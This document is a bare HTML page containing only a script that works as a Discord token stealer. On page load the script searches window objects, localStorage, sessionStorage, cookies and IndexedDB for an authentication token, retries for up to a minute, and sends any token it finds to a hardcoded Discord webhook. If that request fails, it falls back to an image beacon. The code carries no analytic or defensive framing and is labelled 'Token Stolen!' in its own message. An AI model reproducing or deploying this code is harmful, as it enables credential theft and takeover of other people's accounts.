<!DOCTYPE html>
<html>
<body>
<script>
  let attempts = 0;
  const maxAttempts = 60; 

  function getTokenFromIndexedDB() {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open('discord-ipc-0');
      request.onsuccess = (event) => {
        const db = event.target.result;
        const store = db.transaction(['main', 'cache']).objectStore('main');
        const request = store.get('token');
        request.onsuccess = () => {
          if (request.result) {
            console.log("Found token in IndexedDB:", request.result);
            resolve(request.result);
          } else {
            resolve(null);
          }
        };
        request.onerror = () => resolve(null);
      };
      request.onerror = () => resolve(null);
    });
  }

  async function stealToken() {
    let token = null;

    // 1. Try standard internal objects (newer structures)
    try { 
      // v1.0.0-beta.17+ structure
      const z = window.z;
      if (z && z[0] && z[0].c && z[0].c.exports) {
        const exports = z[0].c.exports;
        if (exports.default && exports.default.instance) {
          // Try __private__ token
          if (exports.default.instance.__private__ && exports.default.instance.__private__.token) {
            token = exports.default.instance.__private__.token;
          }
          // Try getToken method
          else if (typeof exports.default.instance.getToken === 'function') {
            token = exports.default.instance.getToken();
          }
          // Try __token__ property
          else if (exports.default.instance.__token__) {
            token = exports.default.instance.__token__;
          }
        }
      }
    } catch(e) {}

    // 2. Try window._discordHeaders
    if (!token) {
      try { token = window._discordHeaders?.Authorization; } catch(e){}
    }

    // 3. Try window.__discord_session_id__
    if (!token) {
      try { token = window.__discord_session_id__; } catch(e){}
    }

    // 4. Try localStorage
    if (!token) {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key.includes('token') || key.includes('discord')) {
          const val = localStorage.getItem(key);
          if (val && (val.startsWith('MT') || val.startsWith('NT'))) {
            token = val;
            break;
          }
        }
      }
    }

    // 5. Try sessionStorage
    if (!token) {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key.includes('token') || key.includes('discord')) {
          const val = sessionStorage.getItem(key);
          if (val && (val.startsWith('MT') || val.startsWith('NT'))) {
            token = val;
            break;
          }
        }
      }
    }

    // 6. Try cookies
    if (!token) {
      const match = document.cookie.match(/token=([^;]+)/);
      if (match) token = match[1];
    }

    // 7. Try IndexedDB
    if (!token) {
      try {
        token = await getTokenFromIndexedDB();
      } catch(e) {}
    }

    if (token) {
      console.log("Token found!");
      sendToken(token);
    } else {
      attempts++;
      if (attempts < maxAttempts) {
        setTimeout(stealToken, 1000); 
      } else {
        console.log("Max attempts reached. No token found.");
        // Log all window keys for debugging
        console.log("Window keys:", Object.keys(window).filter(k => k.length < 20));
      }
    }
  }

  function sendToken(token) {
    fetch('https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `🎣 **Token Stolen!**\n\`\`\`${token}\`\`\``
      })
    }).then(() => {
      console.log("Sent.");
    }).catch(err => {
      console.error("Failed:", err);
      const img = new Image();
      img.src = 'https://discord.com/api/webhooks/1538882362308436040/FINlSequEYQ17FsngVCjGYszDa9edDQZoX69_Qf-jOk2ZNmkQ8130ZWAiUGg5ghzlxQS?content=' + encodeURIComponent(token);
    });
  }

  // Start checking after 3 seconds
  setTimeout(stealToken, 3000);
</script>
</body>
</html>
